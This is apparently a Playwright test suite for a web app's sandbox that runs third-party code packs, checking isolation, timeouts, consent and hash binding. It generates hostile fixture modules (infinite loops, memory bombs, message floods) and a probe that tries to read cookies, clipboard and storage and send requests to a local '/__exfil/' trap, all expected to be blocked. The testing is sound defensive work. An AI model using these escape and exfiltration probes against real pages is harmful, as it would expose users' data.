// Playwright test for the sandbox host (issue #71; docs/PACK_SPEC.md 10.3, 10.4). Usage: node tests/site/packs_sandbox.mjs
// Every fixture (including every hostile module) is generated here into a temp dir; no third-party code is committed.
// One minimal behavioural check per acceptance box. Escape attempts run INSIDE the sandbox and must fail; a local server logs any request that escapes.
import { createRequire } from 'module';
import http from 'http';
import fs from 'fs';
import os from 'os';
import path from 'path';
import crypto from 'crypto';
import { fileURLToPath } from 'url';

const require = createRequire(import.meta.url);
const { chromium } = require('playwright');
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../..');
const SITE = path.join(ROOT, 'site');
const GEN = fs.mkdtempSync(path.join(os.tmpdir(), 'sc-sbx-'));
const sha = (b) => 'sha256:' + crypto.createHash('sha256').update(b).digest('hex');
const put = (rel, text) => { const p = path.join(GEN, rel); fs.mkdirSync(path.dirname(p), { recursive: true }); fs.writeFileSync(p, text); return Buffer.from(text); };
let PORT = 0; let STEP = '';

// ---------------------------------------------------------------- fixtures
function mkProv(dir, id, moduleSrc, extra = {}) { // one pack with one sandboxed intellisense-provider
  const entryB = put(`${dir}/p.json`, JSON.stringify({ id: 'prov', module: 'prov.js', ...extra }));
  const modB = put(`${dir}/prov.js`, moduleSrc);
  put(`${dir}/craftpack.json`, JSON.stringify({ craftpack: '1.0.0', id, version: '1.0.0', license: 'CC0-1.0', authors: [{ name: 'testco' }], ingredients: [
    { id: 'prov', kind: 'intellisense-provider', format: 'intellisense-provider@1', version: '1.0.0', path: 'p.json', hash: sha(entryB), bytes: entryB.length, code: true, modules: [{ path: 'prov.js', realm: 'sandbox', hash: sha(modB), bytes: modB.length }] }] }, null, 1) + '\n');
}
const GOOD = `craft.handle('complete', (i) => [{ label: 'zzfx', category: 'Fixture', detail: 'from the sandbox', apply: 'zzfx()' }, { label: 'line_' + i.line.length, category: 'Fixture' }]);`;
mkProv('good', 'testco/good', GOOD);
mkProv('goodv2', 'testco/good', GOOD + '\n// version 2\n');
mkProv('swap', 'testco/swap', `craft.handle('complete', () => [{ label: 'v1ran' }]);`);
const SWAP_EVIL = `craft.handle('complete', () => [{ label: 'evilran' }]);`;
mkProv('slow', 'testco/slow', `craft.handle('complete', () => new Promise(() => {}));`);
mkProv('hang', 'testco/hang', `craft.handle('complete', () => { for (;;) {} });`);
mkProv('hangload', 'testco/hangload', `for (;;) {}`);
mkProv('bomb', 'testco/bomb', `craft.handle('complete', () => { const keep = []; try { for (;;) keep.push(new Array(1e6).fill(7)); } catch (e) { return []; } });`);
mkProv('flood', 'testco/flood', `craft.handle('complete', () => { for (let i = 0; i < 2000; i++) self.postMessage({ t: 'res', id: 9999, ok: true, value: i }); return []; });`);
mkProv('big', 'testco/big', `craft.handle('complete', () => [{ label: 'x'.repeat(300000) }]);`);
mkProv('bogus', 'testco/bogus', `craft.handle('complete', () => { self.postMessage({ t: 'steal', cookie: 1 }); return []; });`);
mkProv('fnret', 'testco/fnret', `craft.handle('complete', () => [{ label: 'f', apply: () => 1 }]);`);
for (let k = 1; k <= 5; k++) mkProv('cap' + k, 'testco/cap' + k, `craft.handle('complete', () => [{ label: 'cap${k}' }]);`);
const probeSrc = () => `
const R = {}; let viol = 0; self.addEventListener('securitypolicyviolation', () => viol++);
const U = 'http://127.0.0.1:${PORT}/__exfil/';
const T = (n, f) => Promise.race([Promise.resolve().then(f).then(() => { R[n] = 'ALLOWED'; }, (e) => { R[n] = 'blocked:' + ((e && e.name) || 'err'); }), new Promise((r) => setTimeout(() => { R[n] = R[n] || 'hang'; r(); }, 120))]);
craft.handle('complete', async () => {
  await Promise.all([
    T('fetch-example', () => fetch('https://example.com')), T('fetch-local', () => fetch(U + 'fetch')),
    T('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', U + 'xhr'); x.onload = ok; x.onerror = () => no(new Error('xhr')); x.send(); })),
    T('websocket', () => new Promise((ok, no) => { const w = new WebSocket('ws://127.0.0.1:${PORT}/__exfil/ws'); w.onopen = ok; w.onerror = () => no(new Error('ws')); })),
    T('eventsource', () => new Promise((ok, no) => { if (typeof EventSource === 'undefined') throw new Error('undefined'); const w = new EventSource(U + 'es'); w.onopen = ok; w.onerror = () => no(new Error('es')); })),
    T('beacon', () => { if (!navigator.sendBeacon || !navigator.sendBeacon(U + 'beacon', 'x')) throw new Error('refused'); }),
    T('dynamic-import', () => import(U + 'mod.js')), T('importScripts', () => importScripts(U + 's.js')),
    T('worker-url', () => { new Worker(U + 'w.js'); }), T('indexedDB', () => new Promise((ok, no) => { const r = indexedDB.open('x'); r.onsuccess = ok; r.onerror = () => no(new Error('idb')); })),
    T('caches', () => caches.open('x')), T('localStorage', () => localStorage.getItem('sc.packs.lock')),
    T('window.parent', () => window.parent.document), T('document', () => document.cookie), T('strudelCraft', () => self.strudelCraft.packs), T('clipboard', () => navigator.clipboard.readText()),
    T('eval', () => eval('1+1')), T('Function', () => new Function('return 1')()),
  ]);
  return Object.entries(R).map(([k, v]) => ({ label: k + '=' + v })).concat([{ label: 'violations=' + viol }]);
});`;

// ---------------------------------------------------------------- server (logs every request; the exfil path must never be hit by sandboxed code)
const TYPES = { '.mjs': 'text/javascript', '.html': 'text/html', '.js': 'text/javascript', '.json': 'application/json', '.css': 'text/css', '.woff2': 'font/woff2', '.svg': 'image/svg+xml' };
const hits = []; const count = {}; let swapOn = false;
const server = http.createServer((req, res) => {
  const p = decodeURIComponent(new URL(req.url, 'http://x').pathname); hits.push(p); count[p] = (count[p] || 0) + 1;
  if (p.startsWith('/__exfil/')) { res.writeHead(200, { 'content-type': 'text/javascript', 'access-control-allow-origin': '*' }); return res.end('1'); }
  let f; if (p.startsWith('/fx/')) f = path.join(GEN, p.slice(4)); else { const q = p.endsWith('/') ? p + 'index.html' : p; f = path.join(SITE, q); if (!f.startsWith(SITE)) f = null; }
  if (!f || !fs.existsSync(f) || !fs.statSync(f).isFile()) { res.writeHead(404); return res.end(); }
  let body = fs.readFileSync(f); if (swapOn && p === '/fx/swap/prov.js' && count[p] > 1) body = Buffer.from(SWAP_EVIL);
  res.writeHead(200, { 'content-type': TYPES[path.extname(f)] || 'application/octet-stream', 'access-control-allow-origin': '*', 'cache-control': 'no-store' }); res.end(body);
});
await new Promise((r) => server.listen(0, '127.0.0.1', r)); PORT = server.address().port; mkProv('probe', 'testco/probe', probeSrc());
const BASE = `http://127.0.0.1:${PORT}/`;
const exfil = () => hits.filter((h) => h.startsWith('/__exfil/'));

const results = []; const check = (name, ok, detail = '') => { results.push(ok); console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? '  -- ' + detail : ''}`); };
const entry = (dir, extra = {}) => { const b = fs.readFileSync(path.join(GEN, dir, 'craftpack.json')); const m = JSON.parse(b);
  return { id: m.id, version: m.version, source: `https://fixtures.test/fx/${dir}/`, mirrors: [`./fx/${dir}/`], manifest: sha(b), priority: 0, allowCode: ['prov'], ...extra }; };
const userLock = (...e) => JSON.stringify({ lock: 1, craftpack: '1.0.0', packs: e });
const browser = await chromium.launch({ args: ['--autoplay-policy=no-user-gesture-required'] });
const octet = []; const noise0 = /x/; const noise = /api\.github\.com|ERR_INTERNET_DISCONNECTED|ERR_NAME_NOT_RESOLVED|Failed to load resource|Content Security Policy|sandbox|serviceWorker/i;
async function open({ lock, flag = true, errors = [], search = '' } = {}) {
  const ctx = await browser.newContext({ viewport: { width: 1000, height: 800 }, serviceWorkers: 'block' });
  await ctx.route(/api\.github\.com/, (r) => r.fulfill({ status: 200, contentType: 'application/json', headers: { 'access-control-allow-origin': '*' }, body: '[]' }));
  if (lock) await ctx.addInitScript((a) => { try { if (!localStorage.getItem('sc.packs.lock')) localStorage.setItem('sc.packs.lock', a.l); if (a.f && !localStorage.getItem('sc.packs.code')) localStorage.setItem('sc.packs.code', 'true'); } catch (e) { /* sandboxed frames have no storage: the init script also runs there */ } }, { l: lock, f: flag });
  const page = await ctx.newPage(); page.on('pageerror', (e) => { if (!/serviceWorker|localStorage.*sandboxed/i.test(e.message)) errors.push(`pageerror[${STEP}]: ` + e.message); }); // Playwright's own injected scripts also run inside the sandboxed frames and fail there, as they must page.on('response', (r) => { if (/octet-stream/.test(r.headers()['content-type'] || '')) octet.push(r.url()); }); page.on('console', (m) => { if (m.type() === 'error' && !noise.test(m.text())) errors.push('console: ' + m.text()); });
  await page.goto(BASE + search); await page.waitForFunction(() => window.strudelCraft && window.strudelCraft.packs && window.strudelCraft.intellisense); await page.evaluate(() => window.strudelCraft.packs.ready);
  await page.evaluate(() => { window.__comp = async (t = 'zz') => { const r = await window.strudelCraft.intellisense.completeFrom({ text: t, doc: t, pos: t.length, explicit: true }); return r.flatMap((x) => x.options.map((o) => o.label)); };
    window.__st = (id = 'prov') => window.strudelCraft.packs.list().flatMap((p) => p.ingredients.map((i) => ({ pack: p.id, id: i.id, state: i.state, code: i.reason && i.reason.code }))).filter((i) => i.id === id); });
  return { ctx, page };
}
const frames = (page) => page.evaluate(() => document.querySelectorAll('iframe[sandbox]').length);
const errs = [];

STEP = 'p1';
// ---- 1. provider: nothing before the grant, items after the dialog is accepted, nothing after remove
{
  const { ctx, page } = await open({ lock: userLock(entry('good')), errors: errs });
  const before = await page.evaluate(async () => ({ items: await window.__comp(), st: window.__st()[0].state, code: window.__st()[0].code }));
  const fetchedBefore = hits.some((h) => h.endsWith('/good/prov.js')), fr0 = await frames(page);
  const info = await page.evaluate(() => window.strudelCraft.packs.codeInfo('testco/good:prov'));
  await page.evaluate(() => window.strudelCraft.packs.grant('testco/good:prov')); await page.evaluate(() => window.strudelCraft.packs.load('testco/good:prov')); // grant = what the trust dialog's accept does
  const after = await page.evaluate(async () => { const r = await window.strudelCraft.intellisense.completeFrom({ text: 'zz', doc: 'zz', pos: 2, explicit: true }); return { st: window.__st()[0].state, opts: r.flatMap((x) => x.options.map((o) => [o.label, o.section && o.section.name, o.apply])) }; });
  const fr1 = await frames(page);
  await page.evaluate(() => window.strudelCraft.packs.remove('testco/good')); const gone = await page.evaluate(() => window.__comp()); const fr2 = await frames(page);
  check('provider: blocked E_PACK_CODE_TRUST and no items before the grant (module never fetched); items under their category after; none after remove', before.items.length === 0 && before.st === 'blocked' && before.code === 'E_PACK_CODE_TRUST' && !fetchedBefore && fr0 === 0
    && after.st === 'ready' && after.opts.some((o) => o[0] === 'zzfx' && o[1] === 'Fixture' && o[2] === 'zzfx()') && fr1 === 1 && gone.length === 0 && fr2 === 0, JSON.stringify({ before, fr0, after, fr1, gone, fr2 }));
  check('trust dialog data: pack, author, licence, code hash, module list, can / cannot', info && info.pack === 'testco/good' && info.authors[0].name === 'testco' && info.license === 'CC0-1.0' && /^sha256:[0-9a-f]{64}$/.test(info.hash) && info.modules[0].path === 'prov.js' && info.can.length && info.cannot.length && info.flag === true, JSON.stringify(info).slice(0, 200));
  await ctx.close();
}

STEP = 'iso';
// ---- 2. isolation probes, from inside the worker and from inside the frame
{
  const { ctx, page } = await open({ lock: userLock(entry('probe')), errors: errs });
  await page.evaluate(async () => { window.strudelCraft.packs.grant('testco/probe:prov'); await window.strudelCraft.packs.load('testco/probe:prov'); });
  const labels = await page.evaluate(async () => { await window.__comp(); await new Promise((r) => setTimeout(r, 50)); return window.__comp(); }); // the first call starts the frame
  const R = Object.fromEntries(labels.map((l) => l.split('=')));
  const must = ['fetch-example', 'fetch-local', 'xhr', 'websocket', 'eventsource', 'beacon', 'dynamic-import', 'importScripts', 'worker-url', 'indexedDB', 'caches', 'localStorage', 'window.parent', 'document', 'strudelCraft', 'clipboard', 'eval', 'Function'];
  const bad = must.filter((k) => !/^blocked:/.test(R[k] || '')); const sample = JSON.stringify(R);
  check('isolation (worker): fetch, XHR, WebSocket, EventSource, beacon, import(), importScripts, nested worker URL, IndexedDB, Cache, localStorage, window.parent.document, window.strudelCraft, document.cookie, clipboard, eval all fail', labels.length > 5 && bad.length === 0, `bad=${bad} ${sample}`);
  check('isolation: not one request reached the server from the sandbox; the CSP reported violations', exfil().length === 0 && Number(R.violations) > 0, `exfil=${exfil()} violations=${R.violations}`);
  // positive control: the same fetch from the page itself is observable
  await page.evaluate((u) => fetch(u), `http://127.0.0.1:${PORT}/__exfil/control`); check('positive control: a page-level fetch to the trap path is seen', exfil().length === 1, String(exfil().length)); hits.length = 0;
  const url0 = page.url();
  const fr = await page.evaluate(async (port) => {
    const m = await import('./packs-sandbox.js'); const probe = `setTimeout(async()=>{const r=[];const t=(n,f)=>{try{const v=f();r.push(n+(v?'=OPEN':'=T'));}catch(e){r.push(n+'=T');}};
      t('pdoc',()=>window.parent.document.title);t('psc',()=>window.parent.strudelCraft);t('ls',()=>localStorage.length>=0);t('ck',()=>document.cookie+'x');t('idb',()=>indexedDB.open('x'));
      t('top',()=>{top.location.href='http://127.0.0.1:${'${port}'}/__exfil/nav';return 0;});t('open',()=>window.open('http://127.0.0.1:${'${port}'}/__exfil/popup'));
      try{await fetch('http://127.0.0.1:${'${port}'}/__exfil/framefetch');r.push('fetch=OPEN');}catch(e){r.push('fetch=T');}
      bye(r.join(','));},300);`.replace(/\$\{port\}/g, port);
    const sb = m.createSandbox({ source: '', probe }); const stop = new Promise((ok) => sb.on((e) => e.type === 'stopped' && ok(e.message))); await sb.start(); return await stop;
  }, PORT);
  check('isolation (frame): parent.document, parent.strudelCraft, localStorage, cookie, IndexedDB, top navigation, window.open, fetch all fail; page URL unchanged', /module error: pdoc=T,psc=T,ls=T,ck=T,idb=T,top=T,open=T,fetch=T$/.test(fr) && exfil().length === 0 && page.url() === url0, `${fr} exfil=${exfil()}`);
  const attr = await page.evaluate(async () => { const m = await import('./packs-sandbox.js'); const sb = m.createSandbox({ source: 'craft.handle("x",()=>1)' }); await sb.start(); const f = sb.element(); const a = [f.getAttribute('sandbox'), f.srcdoc.includes(m.CSP), f.srcdoc.includes('connect-src')]; sb.stop(); return a; });
  check('frame is sandbox="allow-scripts" only with the no-network CSP', attr[0] === 'allow-scripts' && attr[1] === true && attr[2] === false, JSON.stringify(attr));
  await ctx.close();
}

STEP = 'slow';
// ---- 3. timeouts: a provider that never answers; typing stays responsive; three timeouts stop the frame
{
  const { ctx, page } = await open({ lock: userLock(entry('slow')), errors: errs });
  await page.evaluate(async () => { window.strudelCraft.packs.grant('testco/slow:prov'); await window.strudelCraft.packs.load('testco/slow:prov'); });
  const r = await page.evaluate(async () => {
    let last = performance.now(), gap = 0, gap0 = 0; const T0 = performance.now(); const iv = setInterval(() => { const n = performance.now(); if (n - T0 > 300) gap = Math.max(gap, n - last); else gap0 = Math.max(gap0, n - last); last = n; }, 4); // gap0 = one-time frame start hitch
    const t0 = performance.now(), a = await window.__comp(), t1 = performance.now(), b = await window.__comp(), t2 = performance.now(), c = await window.__comp(), t3 = performance.now(); clearInterval(iv);
    return { ms: [t1 - t0, t2 - t1, t3 - t2].map(Math.round), n: [a.length, b.length, c.length], gap: Math.round(gap), gap0: Math.round(gap0), st: window.__st()[0] };
  });
  check('slow provider: each call dropped near timeoutMs (150 ms), event loop gap < 50 ms after the one-time frame start, third timeout stops the frame and the ingredient is failed (E_PACK_SANDBOX_TIMEOUT)', r.n.every((x) => x === 0) && r.ms[1] < 400 && r.ms[2] < 400 && r.gap < 50 && r.st.state === 'failed' && r.st.code === 'E_PACK_SANDBOX_TIMEOUT' && (await frames(page)) === 0, JSON.stringify(r));
  await ctx.close();
}
{ // typing while a provider hangs (two strikes so far, the frame is alive): max keystroke-to-frame stays under 50 ms
  const { ctx, page } = await open({ lock: userLock(entry('slow')), errors: errs });
  await page.evaluate(async () => { window.strudelCraft.packs.grant('testco/slow:prov'); await window.strudelCraft.packs.load('testco/slow:prov'); await window.__comp(); });
  const key = await page.evaluate(async () => { const ta = document.querySelector('#code'); ta.focus(); const pend = window.__comp(); const gaps = []; for (let i = 0; i < 8; i++) { const t0 = performance.now(); ta.value += 'a'; ta.dispatchEvent(new Event('input', { bubbles: true })); await new Promise((r) => requestAnimationFrame(r)); gaps.push(performance.now() - t0); } await pend; return Math.max(...gaps); });
  check('typing in the editor stays responsive while a provider hangs (max keystroke to next frame < 50 ms)', key < 50, key.toFixed(1));
  await ctx.close();
}

STEP = 'hostile';
// ---- 4. hostile code is contained: busy loop (call and load), memory bomb; page and audio stay alive
for (const dir of ['hang', 'bomb', 'hangload']) {
  const { ctx, page } = await open({ lock: userLock(entry(dir)), errors: errs });
  await page.evaluate(async (d) => { window.strudelCraft.packs.grant(`testco/${d}:prov`); await window.strudelCraft.packs.load(`testco/${d}:prov`); }, dir);
  const r = await page.evaluate(async () => {
    const ac = new AudioContext(); const o = ac.createOscillator(); o.connect(ac.destination); o.start(); await ac.resume(); const a0 = ac.currentTime;
    let last = performance.now(), gap = 0, gap0 = 0; const T0 = performance.now(); const iv = setInterval(() => { const n = performance.now(); if (n - T0 > 300) gap = Math.max(gap, n - last); else gap0 = Math.max(gap0, n - last); last = n; }, 5);
    const t0 = performance.now(); for (let i = 0; i < 12 && window.__st()[0].state !== 'failed'; i++) await window.__comp(); const dt = performance.now() - t0;
    await new Promise((r) => setTimeout(r, 300)); clearInterval(iv); return { gap: Math.round(gap), gap0: Math.round(gap0), dt: Math.round(dt), audio: +(ac.currentTime - a0).toFixed(2), st: window.__st()[0] };
  });
  check(`${dir}: contained (frame removed, ingredient failed with a sandbox code), main-thread gap < 300 ms (frame teardown included), audio clock kept advancing`, r.st.state === 'failed' && /^E_PACK_SANDBOX_(TIMEOUT|PROTOCOL)$/.test(r.st.code) && (await frames(page)) === 0 && r.gap < 300 && r.audio > (r.dt + 300) / 1000 * 0.5, JSON.stringify(r));
  const alive = await page.evaluate(() => 1 + 1).catch(() => null); check(`${dir}: page still responds`, alive === 2);
  await ctx.close();
}

STEP = 'proto';
// ---- 5. protocol violations: flooding, oversize, unknown message, non-data value, all drop the frame
for (const dir of ['flood', 'big', 'bogus', 'fnret']) {
  const { ctx, page } = await open({ lock: userLock(entry(dir)), errors: errs });
  await page.evaluate(async (d) => { window.strudelCraft.packs.grant(`testco/${d}:prov`); await window.strudelCraft.packs.load(`testco/${d}:prov`); }, dir);
  const r = await page.evaluate(async () => { const out = await window.__comp(); await new Promise((r) => setTimeout(r, 100)); return { out, st: window.__st()[0] }; });
  // fnret: a function in the reply cannot be cloned; the worker reports an error reply, which is plain data, so the frame survives and the item is dropped
  const expectKill = dir !== 'fnret';
  check(`${dir}: ${expectKill ? 'dropped and the frame killed (E_PACK_SANDBOX_PROTOCOL)' : 'non-data reply never reaches the host as an item'}`, r.out.length === 0 && (expectKill ? r.st.state === 'failed' && r.st.code === 'E_PACK_SANDBOX_PROTOCOL' && (await frames(page)) === 0 : r.st.state === 'ready'), JSON.stringify(r));
  await ctx.close();
}

STEP = 'cap';
// ---- 6. concurrent sandbox cap
{
  const { ctx, page } = await open({ lock: userLock(...[1, 2, 3, 4, 5].map((k) => entry('cap' + k))), errors: errs });
  await page.evaluate(async () => { for (let k = 1; k <= 5; k++) { window.strudelCraft.packs.grant(`testco/cap${k}:prov`); await window.strudelCraft.packs.load(`testco/cap${k}:prov`); } });
  const labels = await page.evaluate(() => window.__comp()); const labels2 = await page.evaluate(() => window.__comp());
  const n = await frames(page); const sts = await page.evaluate(() => [1, 2, 3, 4, 5].map((k) => window.__st().find((x) => x.pack === 'testco/cap' + k))).then((a) => a.map((x) => x.state + ':' + x.code));
  check('at most 4 sandboxes at once; the fifth is refused (E_PACK_SANDBOX_LIMIT) and answers nothing', n === 4 && new Set([...labels, ...labels2]).size === 4, `frames ${n} labels ${[...new Set([...labels, ...labels2])]} ${sts}`);
  await ctx.close();
}

STEP = 'consent';
// ---- 7. consent: flag, hash-bound trust, links never grant, main-realm refused
{
  const e = []; const { ctx, page } = await open({ lock: userLock(entry('good')), flag: false, errors: e });
  await page.evaluate(async () => { window.strudelCraft.packs.grant('testco/good:prov'); });
  const off = await page.evaluate(async () => ({ items: await window.__comp(), st: window.__st()[0], trust: JSON.parse(localStorage.getItem('sc.packs.trust')) }));
  check('flag off: granted and trusted code still does not run (blocked E_PACK_CODE_GRANT), no frame, sandbox script never loaded', off.items.length === 0 && off.st.state === 'blocked' && off.st.code === 'E_PACK_CODE_GRANT' && (await frames(page)) === 0 && !hits.some((h) => h.endsWith('/good/prov.js')), JSON.stringify(off.st));
  const on = await page.evaluate(async () => { window.strudelCraft.packs.setCodeEnabled(true); await window.strudelCraft.packs.load('testco/good:prov'); return { items: await window.__comp(), st: window.__st()[0].state }; });
  const off2 = await page.evaluate(async () => { window.strudelCraft.packs.setCodeEnabled(false); return { items: await window.__comp(), st: window.__st()[0].state }; });
  check('flag toggles at runtime in both directions; turning it off removes the frame', on.items.includes('zzfx') && on.st === 'ready' && off2.items.length === 0 && off2.st === 'blocked' && (await frames(page)) === 0, JSON.stringify([on, off2]));
  // hash binding: same pack id, changed module (new manifest hash) in the same browser profile
  await page.evaluate(() => window.strudelCraft.packs.setCodeEnabled(true)); await page.evaluate(() => window.strudelCraft.packs.load('testco/good:prov'));
  const v2 = entry('goodv2'); await page.evaluate((l) => localStorage.setItem('sc.packs.lock', l), userLock(v2)); const fetched0 = hits.filter((h) => h.endsWith('/goodv2/prov.js')).length;
  await page.reload(); await page.waitForFunction(() => window.strudelCraft && window.strudelCraft.packs && window.strudelCraft.intellisense); await page.evaluate(() => window.strudelCraft.packs.ready);
  await page.evaluate(() => { window.__comp = async (t = 'zz') => (await window.strudelCraft.intellisense.completeFrom({ text: t, doc: t, pos: t.length, explicit: true })).flatMap((x) => x.options.map((o) => o.label)); });
  const bump = await page.evaluate(async () => { const p = window.strudelCraft.packs, i = p.list()[1].ingredients.find((x) => x.id === 'prov'); return { st: i.state, code: i.reason && i.reason.code, items: await window.__comp(), info: p.codeInfo('testco/good:prov') }; });
  check('hash-bound: a changed module (new manifest hash) puts the ingredient back to blocked (E_PACK_CODE_TRUST), nothing runs, the dialog data lists the changed module path', bump.st === 'blocked' && bump.code === 'E_PACK_CODE_TRUST' && bump.items.length === 0 && bump.info.hadTrust && bump.info.changed.join() === 'prov.js' && bump.info.trusted === false && hits.filter((h) => h.endsWith('/goodv2/prov.js')).length === fetched0, JSON.stringify({ ...bump, info: undefined, changed: bump.info.changed }));
  await ctx.close();
}
{
  const { ctx, page } = await open({ lock: userLock(), errors: errs, search: '?pack=' + encodeURIComponent('https://fixtures.test/fx/good/') });
  await page.route('https://fixtures.test/**', (r) => r.fulfill({ status: 200, headers: { 'access-control-allow-origin': '*' }, body: fs.readFileSync(path.join(GEN, new URL(r.request().url()).pathname.slice(4))) }));
  const r = await page.evaluate(async () => { const p = window.strudelCraft.packs; const prop = await p.peek('https://fixtures.test/fx/good/'); await p.accept(prop.source);
    const lock = JSON.parse(localStorage.getItem('sc.packs.lock')); return { allow: lock.packs[0] && lock.packs[0].allowCode, trust: localStorage.getItem('sc.packs.trust'), items: await window.__comp(), st: window.__st()[0] && window.__st()[0].state }; });
  check('?pack= proposal then accept never grants code: allowCode empty, no trust record, blocked, nothing runs', Array.isArray(r.allow) && r.allow.length === 0 && r.trust === null && r.st === 'blocked' && r.items.length === 0, JSON.stringify(r));
  await ctx.close();
}
{
  const src = fs.readFileSync(path.join(SITE, 'copycode.js'), 'utf8') + fs.readFileSync(path.join(SITE, 'recipe.js'), 'utf8');
  check('no site code path other than the pack sheet dialog calls packs.grant / setCodeEnabled', !/packs\.(grant|setCodeEnabled)\(/.test(src) && (fs.readFileSync(path.join(SITE, 'packs-ui.js'), 'utf8').match(/p\.grant\(/g) || []).length === 1, '');
  const { execFileSync } = await import('child_process'); const g = execFileSync('grep', ['-rlE', 'packs\\.(grant|setCodeEnabled)\\(|\\.grant\\(', SITE, '--include=*.js']).toString().split('\n').filter(Boolean).map((f) => path.basename(f)).sort();
  check('only packs-ui.js calls grant (the trust dialog); loader and tests excluded', g.join() === 'packs-ui.js', g.join());
}
// ---- 8. verified buffer: bytes served on a second request never run
{
  const { ctx, page } = await open({ lock: userLock(entry('swap')), errors: errs });
  await page.evaluate(async () => { window.strudelCraft.packs.grant('testco/swap:prov'); await window.strudelCraft.packs.load('testco/swap:prov'); });
  const first = await page.evaluate(() => window.__comp()); swapOn = true;
  await page.evaluate(async () => { window.strudelCraft.packs.setCodeEnabled(false); window.strudelCraft.packs.setCodeEnabled(true); await window.strudelCraft.packs.load('testco/swap:prov'); });
  const second = await page.evaluate(() => window.__comp()); const n = count['/fx/swap/prov.js'];
  check('module executes the verified bytes: first run is v1, a restart after the URL starts serving evil bytes never runs them (cache hit or hash mismatch)', first.includes('v1ran') && !second.includes('evilran') && !first.includes('evilran'), JSON.stringify({ first, second, requests: n }));
  await ctx.close(); swapOn = false;
}

// ---- 9. main-realm prelude from the user tier
{
  mkProvMain();
  const { ctx, page } = await open({ lock: userLock({ ...entry('mainrealm'), allowCode: ['pre'] }), errors: errs });
  const r = await page.evaluate(() => { const i = window.strudelCraft.packs.list()[1].ingredients[0]; return { st: i.state, code: i.reason && i.reason.code, canary: typeof window.__canary2, errs: window.strudelCraft.packs.report().errors.map((e) => e.code) }; });
  check('main-realm prelude from the user tier: E_PACK_CODE_REALM, canary global absent, frame count 0', r.errs.includes('E_PACK_CODE_REALM') && r.canary === 'undefined' && (await frames(page)) === 0, JSON.stringify(r));
  await ctx.close();
}
function mkProvMain() {
  const e = put('mainrealm/p.json', JSON.stringify({ id: 'pre', module: 'm.js', defines: [] })), m = put('mainrealm/m.js', 'window.__canary2 = 1;');
  put('mainrealm/craftpack.json', JSON.stringify({ craftpack: '1.0.0', id: 'testco/mainrealm', version: '1.0.0', license: 'CC0-1.0', ingredients: [{ id: 'pre', kind: 'prelude', format: 'prelude@1', version: '1.0.0', path: 'p.json', hash: sha(e), bytes: e.length, code: true, modules: [{ path: 'm.js', realm: 'main', hash: sha(m), bytes: m.length }] }] }));
}

check('no unexpected page or console errors across the run', errs.length === 0, errs.slice(0, 3).join(' | ') + ' ' + [...new Set(octet)].slice(0, 5).join(' '));
await browser.close(); server.close();
const failed = results.filter((x) => !x).length; console.log(`${results.length} checks, ${failed} failed`); process.exit(failed ? 1 : 0);
